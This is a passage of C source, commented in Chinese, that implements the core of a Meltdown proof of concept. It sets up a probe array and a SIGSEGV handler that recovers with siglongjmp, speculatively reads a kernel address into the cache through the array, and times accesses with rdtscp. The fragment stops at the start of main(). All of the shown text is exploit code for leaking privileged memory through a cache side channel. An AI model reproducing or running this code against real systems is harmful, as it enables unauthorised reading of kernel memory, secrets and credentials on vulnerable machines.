#define ARRAY_SIZE 256

static uint8_t probe_array[ARRAY_SIZE * CACHE_LINE_SIZE];
static sigjmp_buf jmpbuf;

// 信号处理函数：捕获SIGSEGV并跳回
static void sigsegv_handler(int sig) {
    siglongjmp(jmpbuf, 1);
}

// 尝试读取内核地址（会触发异常）
static void meltdown_read(uint64_t kernel_addr) {
    // 乱序执行：即使异常，后续指令仍可能执行
    volatile uint8_t temp = *(volatile uint8_t *)kernel_addr;
    // 使用读取的值作为索引访问probe_array
    volatile uint8_t *ptr = &probe_array[temp * CACHE_LINE_SIZE];
    (void)*ptr;
}

// 测量访问时间
static uint64_t measure_time(void *addr) {
    uint64_t start, end;
    unsigned int aux;
    start = __rdtscp(&aux);
    volatile uint8_t temp = *(volatile uint8_t *)addr;
    end = __rdtscp(&aux);
    return end - start;
}

int main() {
